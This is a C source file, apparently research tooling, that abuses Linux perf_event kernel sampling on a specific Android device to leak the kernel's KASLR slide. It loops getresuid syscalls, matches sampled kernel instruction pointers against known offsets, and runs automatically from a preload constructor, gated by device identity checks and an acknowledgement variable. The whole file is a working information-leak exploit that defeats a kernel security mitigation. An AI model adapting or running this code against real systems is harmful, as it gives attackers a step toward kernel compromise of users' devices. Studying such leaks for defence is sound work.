#define _GNU_SOURCE

#include <errno.h>
#include <fcntl.h>
#include <linux/perf_event.h>
#include <sched.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/system_properties.h>
#include <sys/types.h>
#include <sys/utsname.h>
#include <time.h>
#include <unistd.h>

#include "target.h"

#define EXPECTED_MODEL TARGET_EXPECTED_MODEL
#define EXPECTED_DISPLAY TARGET_EXPECTED_DISPLAY
#define EXPECTED_FINGERPRINT TARGET_EXPECTED_FINGERPRINT
#define EXPECTED_KERNEL TARGET_EXPECTED_KERNEL_RELEASE
#define EXPECTED_BOOT_ID TARGET_MEASURED_BOOT_ID
#define REQUIRED_ACK PERF_SLIDE_REQUIRED_ACK

#define PROBE_CPU 0
#define SAMPLE_FREQUENCY 4000
#define RING_DATA_PAGES 64
#define MAX_BATCHES 24
#define BATCH_NS 250000000ULL
#define CHECK_INTERVAL 4096ULL

#define EXPECTED_SAMPLE_SIZE (sizeof(struct perf_event_header) + 8 + 8)

static const uint64_t k_target_offsets[] = {
    PERF_SLIDE_PC_0_OFF, PERF_SLIDE_PC_1_OFF, PERF_SLIDE_PC_2_OFF,
    PERF_SLIDE_PC_3_OFF, PERF_SLIDE_PC_4_OFF, PERF_SLIDE_PC_5_OFF,
    PERF_SLIDE_PC_6_OFF,
};

struct candidate {
  uint64_t slide;
  uint64_t offset_mask;
  unsigned int hits;
};

struct probe_stats {
  uint64_t records;
  uint64_t samples;
  uint64_t kernel_samples;
  uint64_t pid_tid_samples;
  uint64_t target_hits;
  uint64_t lost_records;
  uint64_t lost_samples;
  uint64_t throttle_records;
  uint64_t malformed_records;
  uint64_t overrun_batches;
  uint64_t other_records;
  struct candidate candidates[64];
  size_t candidate_count;
};

static int property_matches(const char *name, const char *expected) {
  char value[PROP_VALUE_MAX] = {0};
  int size = __system_property_get(name, value);
  if (size <= 0 || strcmp(value, expected) != 0) {
    fprintf(stderr, "identity_mismatch property=%s value=%s expected=%s\n",
            name, size > 0 ? value : "<unavailable>", expected);
    return 0;
  }
  return 1;
}

static int read_line(const char *path, char *value, size_t capacity) {
  if (capacity < 2) {
    errno = EINVAL;
    return 0;
  }
  int fd = open(path, O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    return 0;
  }
  ssize_t size = read(fd, value, capacity - 1);
  int saved_errno = errno;
  int close_ok = close(fd) == 0;
  if (size < 0 || !close_ok) {
    errno = size < 0 ? saved_errno : errno;
    return 0;
  }
  value[size] = 0;
  value[strcspn(value, "\r\n")] = 0;
  return 1;
}

static int runtime_gate(char boot_id[64]) {
  struct utsname uts;
  char enforcing[16] = {0};
  const char *ack = getenv("G781W_HYJ1_PERF_IP_TID");
  int ok = ack && strcmp(ack, REQUIRED_ACK) == 0;
  if (!ok) {
    fprintf(stderr, "locked acknowledgement_missing\n");
  }
  ok &= property_matches("ro.product.model", EXPECTED_MODEL);
  ok &= property_matches("ro.build.display.id", EXPECTED_DISPLAY);
  ok &= property_matches("ro.build.fingerprint", EXPECTED_FINGERPRINT);
  ok &= property_matches("sys.boot_completed", "1");
  if (uname(&uts) != 0 || strcmp(uts.release, EXPECTED_KERNEL) != 0) {
    fprintf(stderr, "identity_mismatch kernel=%s expected=%s errno=%d\n",
            errno ? "<unavailable>" : uts.release, EXPECTED_KERNEL, errno);
    ok = 0;
  }
  if (!read_line("/proc/sys/kernel/random/boot_id", boot_id, 64) ||
      strcmp(boot_id, EXPECTED_BOOT_ID) != 0) {
    fprintf(stderr, "identity_mismatch boot_id=%s expected=%s errno=%d\n",
            boot_id[0] ? boot_id : "<unavailable>", EXPECTED_BOOT_ID, errno);
    ok = 0;
  }
  if (!read_line("/sys/fs/selinux/enforce", enforcing,
                 sizeof(enforcing)) || strcmp(enforcing, "1") != 0) {
    fprintf(stderr, "identity_mismatch enforcing=%s\n",
            enforcing[0] ? enforcing : "<unavailable>");
    ok = 0;
  }
  if (getuid() != 2000 || geteuid() != 2000) {
    fprintf(stderr, "identity_mismatch uid=%u euid=%u expected=2000\n",
            getuid(), geteuid());
    ok = 0;
  }
  return ok;
}

static uint64_t monotonic_ns(void) {
  struct timespec now;
  if (clock_gettime(CLOCK_MONOTONIC, &now) != 0) {
    return 0;
  }
  return (uint64_t)now.tv_sec * 1000000000ULL + (uint64_t)now.tv_nsec;
}

static inline long raw_getresuid(uid_t *ruid, uid_t *euid, uid_t *suid) {
  register long x0 __asm__("x0") = (long)ruid;
  register long x1 __asm__("x1") = (long)euid;
  register long x2 __asm__("x2") = (long)suid;
  register long x8 __asm__("x8") = __NR_getresuid;
  __asm__ volatile("svc #0"
                   : "+r"(x0)
                   : "r"(x1), "r"(x2), "r"(x8)
                   : "memory");
  return x0;
}

static int perf_event_open_local(struct perf_event_attr *attr) {
  return (int)syscall(__NR_perf_event_open, attr, 0, -1, -1,
                      PERF_FLAG_FD_CLOEXEC);
}

static uint64_t load_u64(const unsigned char *cursor) {
  uint64_t value;
  memcpy(&value, cursor, sizeof(value));
  return value;
}

static uint32_t load_u32(const unsigned char *cursor) {
  uint32_t value;
  memcpy(&value, cursor, sizeof(value));
  return value;
}

static void ring_copy(const unsigned char *ring, size_t ring_size,
                      uint64_t position, void *destination, size_t length) {
  size_t offset = (size_t)(position & (ring_size - 1));
  size_t first = ring_size - offset;
  if (first > length) {
    first = length;
  }
  memcpy(destination, ring + offset, first);
  if (first < length) {
    memcpy((unsigned char *)destination + first, ring, length - first);
  }
}

static int decode_target_pc(uint64_t pc, uint64_t *slide,
                            size_t *offset_index) {
  for (size_t index = 0;
       index < sizeof(k_target_offsets) / sizeof(k_target_offsets[0]);
       ++index) {
    uint64_t unslid = KIMAGE_TEXT_BASE + k_target_offsets[index];
    if (pc < unslid) {
      continue;
    }
    uint64_t candidate = pc - unslid;
    if (candidate <= TARGET_KASLR_SLIDE_MAX &&
        (candidate & (TARGET_KASLR_ALIGNMENT - 1)) == 0) {
      *slide = candidate;
      *offset_index = index;
      return 1;
    }
  }
  return 0;
}

static struct candidate *get_candidate(struct probe_stats *stats,
                                       uint64_t slide) {
  for (size_t index = 0; index < stats->candidate_count; ++index) {
    struct candidate *candidate = &stats->candidates[index];
    if (candidate->slide == slide) {
      return candidate;
    }
  }
  if (stats->candidate_count >=
      sizeof(stats->candidates) / sizeof(stats->candidates[0])) {
    return NULL;
  }
  struct candidate *candidate =
      &stats->candidates[stats->candidate_count++];
  memset(candidate, 0, sizeof(*candidate));
  candidate->slide = slide;
  return candidate;
}

static void inspect_sample(const unsigned char *record,
                           const struct perf_event_header *header,
                           pid_t expected_pid, pid_t expected_tid,
                           struct probe_stats *stats) {
  const unsigned char *cursor = record + sizeof(*header);
  uint64_t sampled_ip = load_u64(cursor);
  cursor += 8;
  uint32_t pid = load_u32(cursor);
  uint32_t tid = load_u32(cursor + 4);

  ++stats->samples;
  if ((header->misc & PERF_RECORD_MISC_CPUMODE_MASK) !=
      PERF_RECORD_MISC_KERNEL) {
    return;
  }
  ++stats->kernel_samples;
  if (pid != (uint32_t)expected_pid || tid != (uint32_t)expected_tid) {
    return;
  }
  ++stats->pid_tid_samples;

  uint64_t slide = 0;
  size_t offset_index = 0;
  if (!decode_target_pc(sampled_ip, &slide, &offset_index)) {
    return;
  }

  struct candidate *candidate = get_candidate(stats, slide);
  if (!candidate) {
    ++stats->malformed_records;
    return;
  }
  ++candidate->hits;
  candidate->offset_mask |= 1ULL << offset_index;
  ++stats->target_hits;

  printf("target_hit=%llu raw_pc=0x%llx slide=0x%llx "
         "candidate_hits=%u\n",
         (unsigned long long)stats->target_hits,
         (unsigned long long)k_target_offsets[offset_index],
         (unsigned long long)slide, candidate->hits);
}

static int drain_ring(struct perf_event_mmap_page *metadata,
                      const unsigned char *ring, size_t ring_size,
                      pid_t expected_pid, pid_t expected_tid,
                      struct probe_stats *stats) {
  uint64_t head = __atomic_load_n(&metadata->data_head, __ATOMIC_ACQUIRE);
  uint64_t tail = __atomic_load_n(&metadata->data_tail, __ATOMIC_RELAXED);
  if (head - tail > ring_size) {
    ++stats->overrun_batches;
    fprintf(stderr,
            "ring_overrun head=%llu tail=%llu data_size=%zu refusing_resync\n",
            (unsigned long long)head, (unsigned long long)tail, ring_size);
    return 0;
  }

  while (tail < head) {
    struct perf_event_header header;
    ring_copy(ring, ring_size, tail, &header, sizeof(header));
    if (header.size < sizeof(header) || header.size > 256 ||
        tail + header.size > head) {
      ++stats->malformed_records;
      fprintf(stderr,
              "malformed_record tail=%llu head=%llu type=%u size=%u\n",
              (unsigned long long)tail, (unsigned long long)head,
              header.type, header.size);
      return 0;
    }

    unsigned char record[256];
    ring_copy(ring, ring_size, tail, record, header.size);
    ++stats->records;
    if (header.type == PERF_RECORD_SAMPLE) {
      if (header.size != EXPECTED_SAMPLE_SIZE) {
        ++stats->malformed_records;
        fprintf(stderr, "malformed_sample size=%u expected=%zu\n",
                header.size, (size_t)EXPECTED_SAMPLE_SIZE);
        return 0;
      }
      inspect_sample(record, &header, expected_pid, expected_tid, stats);
    } else if (header.type == PERF_RECORD_LOST) {
      ++stats->lost_records;
      if (header.size >= sizeof(header) + 16) {
        stats->lost_samples += load_u64(record + sizeof(header) + 8);
      }
    } else if (header.type == PERF_RECORD_THROTTLE ||
               header.type == PERF_RECORD_UNTHROTTLE) {
      ++stats->throttle_records;
#ifdef PERF_RECORD_LOST_SAMPLES
    } else if (header.type == PERF_RECORD_LOST_SAMPLES) {
      ++stats->lost_records;
      if (header.size >= sizeof(header) + 8) {
        stats->lost_samples += load_u64(record + sizeof(header));
      }
#endif
    } else {
      ++stats->other_records;
    }
    tail += header.size;
  }

  __atomic_store_n(&metadata->data_tail, tail, __ATOMIC_RELEASE);
  return 1;
}

static unsigned int bit_count_u64(uint64_t value) {
  return (unsigned int)__builtin_popcountll(value);
}

static int candidate_confirmed(const struct candidate *candidate) {
  return candidate->hits >= 3 && bit_count_u64(candidate->offset_mask) >= 2;
}

static int run_probe(void) {
  setvbuf(stdout, NULL, _IOLBF, 0);
  char boot_id[64] = {0};
  if (!runtime_gate(boot_id)) {
    return 125;
  }

  cpu_set_t cpus;
  CPU_ZERO(&cpus);
  CPU_SET(PROBE_CPU, &cpus);
  if (sched_setaffinity(0, sizeof(cpus), &cpus) != 0 ||
      sched_getcpu() != PROBE_CPU) {
    fprintf(stderr, "affinity_error cpu=%d expected=%d errno=%d\n",
            sched_getcpu(), PROBE_CPU, errno);
    return 3;
  }

  volatile uid_t ruid = (uid_t)-1;
  volatile uid_t euid = (uid_t)-1;
  volatile uid_t suid = (uid_t)-1;
  long initial_rc = raw_getresuid((uid_t *)&ruid, (uid_t *)&euid,
                                  (uid_t *)&suid);
  if (initial_rc != 0 || ruid != 2000 || euid != 2000 || suid != 2000) {
    fprintf(stderr,
            "getresuid_gate_failed rc=%ld ruid=%u euid=%u suid=%u errno=%d\n",
            initial_rc, ruid, euid, suid, errno);
    return 3;
  }

  struct perf_event_attr attr;
  memset(&attr, 0, sizeof(attr));
  attr.type = PERF_TYPE_SOFTWARE;
  attr.size = PERF_ATTR_SIZE_VER5;
  attr.config = PERF_COUNT_SW_CPU_CLOCK;
  attr.sample_freq = SAMPLE_FREQUENCY;
  attr.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_TID;
  attr.disabled = 1;
  attr.freq = 1;
  attr.exclude_user = 1;
  attr.exclude_kernel = 0;
  attr.exclude_hv = 1;
  attr.wakeup_events = 1;

  errno = 0;
  int perf_fd = perf_event_open_local(&attr);
  if (perf_fd < 0) {
    fprintf(stderr, "perf_event_open_failed errno=%d (%s)\n", errno,
            strerror(errno));
    return 3;
  }

  long page_size_long = sysconf(_SC_PAGESIZE);
  if (page_size_long <= 0 ||
      ((unsigned long)page_size_long &
       ((unsigned long)page_size_long - 1)) != 0) {
    fprintf(stderr, "page_size_invalid value=%ld errno=%d\n",
            page_size_long, errno);
    close(perf_fd);
    return 3;
  }
  size_t page_size = (size_t)page_size_long;
  size_t ring_size = RING_DATA_PAGES * page_size;
  size_t map_size = ring_size + page_size;
  struct perf_event_mmap_page *metadata =
      mmap(NULL, map_size, PROT_READ | PROT_WRITE, MAP_SHARED, perf_fd, 0);
  if (metadata == MAP_FAILED) {
    fprintf(stderr, "perf_mmap_failed bytes=%zu errno=%d (%s)\n",
            map_size, errno, strerror(errno));
    close(perf_fd);
    return 3;
  }
  if (metadata->data_offset != page_size ||
      metadata->data_size != ring_size ||
      (metadata->data_size & (metadata->data_size - 1)) != 0 ||
      metadata->data_offset + metadata->data_size > map_size) {
    fprintf(stderr,
            "ring_metadata_invalid offset=%llu size=%llu page=%zu map=%zu\n",
            (unsigned long long)metadata->data_offset,
            (unsigned long long)metadata->data_size, page_size, map_size);
    munmap(metadata, map_size);
    close(perf_fd);
    return 3;
  }
  unsigned char *ring =
      (unsigned char *)metadata + metadata->data_offset;

  pid_t pid = getpid();
  pid_t tid = (pid_t)syscall(__NR_gettid);
  printf("probe_start boot_id=%s uid=%u cpu=%d pid=%d tid=%d "
         "frequency=%d ring_bytes=%zu "
         "target_raw=0x544e4-0x544fc\n",
         boot_id, getuid(), sched_getcpu(), pid, tid, SAMPLE_FREQUENCY,
         ring_size);

  struct probe_stats stats;
  memset(&stats, 0, sizeof(stats));
  uint64_t total_syscalls = 0;
  int ring_ok = 1;
  int found_confirmed = 0;

  for (unsigned int batch = 0; batch < MAX_BATCHES; ++batch) {
    if (ioctl(perf_fd, PERF_EVENT_IOC_RESET, 0) != 0 ||
        ioctl(perf_fd, PERF_EVENT_IOC_ENABLE, 0) != 0) {
      fprintf(stderr, "perf_enable_failed batch=%u errno=%d (%s)\n",
              batch + 1, errno, strerror(errno));
      ring_ok = 0;
      break;
    }

    uint64_t started = monotonic_ns();
    if (!started) {
      fprintf(stderr, "clock_failed batch=%u errno=%d\n", batch + 1,
              errno);
      ioctl(perf_fd, PERF_EVENT_IOC_DISABLE, 0);
      ring_ok = 0;
      break;
    }
    uint64_t batch_syscalls = 0;
    do {
      for (uint64_t count = 0; count < CHECK_INTERVAL; ++count) {
        long rc = raw_getresuid((uid_t *)&ruid, (uid_t *)&euid,
                                (uid_t *)&suid);
        if (rc != 0 || ruid != 2000 || euid != 2000 || suid != 2000) {
          fprintf(stderr,
                  "getresuid_failed batch=%u rc=%ld ruid=%u euid=%u "
                  "suid=%u errno=%d\n",
                  batch + 1, rc, ruid, euid, suid, errno);
          ioctl(perf_fd, PERF_EVENT_IOC_DISABLE, 0);
          ring_ok = 0;
          goto finished;
        }
      }
      batch_syscalls += CHECK_INTERVAL;
    } while (monotonic_ns() - started < BATCH_NS);

    if (ioctl(perf_fd, PERF_EVENT_IOC_DISABLE, 0) != 0) {
      fprintf(stderr, "perf_disable_failed batch=%u errno=%d (%s)\n",
              batch + 1, errno, strerror(errno));
      ring_ok = 0;
      break;
    }
    total_syscalls += batch_syscalls;
    if (!drain_ring(metadata, ring, ring_size, pid, tid, &stats)) {
      ring_ok = 0;
      break;
    }
    printf("batch=%u syscalls=%llu records=%llu samples=%llu target_hits=%llu\n",
           batch + 1, (unsigned long long)batch_syscalls,
           (unsigned long long)stats.records,
           (unsigned long long)stats.samples,
           (unsigned long long)stats.target_hits);

    for (size_t index = 0; index < stats.candidate_count; ++index) {
      if (candidate_confirmed(&stats.candidates[index])) {
        found_confirmed = 1;
        break;
      }
    }
    if (found_confirmed) {
      break;
    }
  }

finished:
  ioctl(perf_fd, PERF_EVENT_IOC_DISABLE, 0);
  if (ring_ok && !drain_ring(metadata, ring, ring_size, pid, tid, &stats)) {
    ring_ok = 0;
  }

  printf("summary syscalls=%llu records=%llu samples=%llu kernel=%llu "
         "pid_tid=%llu target_hits=%llu "
         "lost_records=%llu lost_samples=%llu throttle=%llu malformed=%llu "
         "overruns=%llu other=%llu candidates=%zu\n",
         (unsigned long long)total_syscalls,
         (unsigned long long)stats.records,
         (unsigned long long)stats.samples,
         (unsigned long long)stats.kernel_samples,
         (unsigned long long)stats.pid_tid_samples,
         (unsigned long long)stats.target_hits,
         (unsigned long long)stats.lost_records,
         (unsigned long long)stats.lost_samples,
         (unsigned long long)stats.throttle_records,
         (unsigned long long)stats.malformed_records,
         (unsigned long long)stats.overrun_batches,
         (unsigned long long)stats.other_records, stats.candidate_count);

  const struct candidate *confirmed = NULL;
  for (size_t index = 0; index < stats.candidate_count; ++index) {
    const struct candidate *candidate = &stats.candidates[index];
    printf("candidate=%zu slide=0x%llx hits=%u distinct_offsets=%u "
           "offset_mask=0x%llx\n",
           index, (unsigned long long)candidate->slide,
           candidate->hits, bit_count_u64(candidate->offset_mask),
           (unsigned long long)candidate->offset_mask);
    if (candidate_confirmed(candidate)) {
      if (confirmed && confirmed->slide != candidate->slide) {
        fprintf(stderr, "confirmation_conflict multiple_stable_candidates\n");
        ring_ok = 0;
      }
      confirmed = candidate;
    }
  }

  int clean_ring = ring_ok && stats.lost_records == 0 &&
                   stats.throttle_records == 0 &&
                   stats.malformed_records == 0 &&
                   stats.overrun_batches == 0;
  int exit_status = 2;
  if (!clean_ring) {
    fprintf(stderr, "result=invalid_perf_stream\n");
    exit_status = 3;
  } else if (confirmed &&
             confirmed->slide == TARGET_EVIDENCE_TOTAL_SLIDE) {
    printf("result=confirmed_current_boot slide=0x%llx hits=%u "
           "distinct_offsets=%u\n",
           (unsigned long long)confirmed->slide,
           confirmed->hits, bit_count_u64(confirmed->offset_mask));
    exit_status = 0;
  } else if (confirmed) {
    fprintf(stderr,
            "result=recorded_slide_mismatch observed=0x%llx expected=0x%llx\n",
            (unsigned long long)confirmed->slide,
            (unsigned long long)TARGET_EVIDENCE_TOTAL_SLIDE);
    exit_status = 3;
  } else {
    printf("result=unconfirmed_no_stable_exact_window\n");
  }

  munmap(metadata, map_size);
  close(perf_fd);
  return exit_status;
}

__attribute__((constructor)) static void preload_entry(void) {
  int status = run_probe();
  if (status != 0) {
    _exit(status);
  }
}
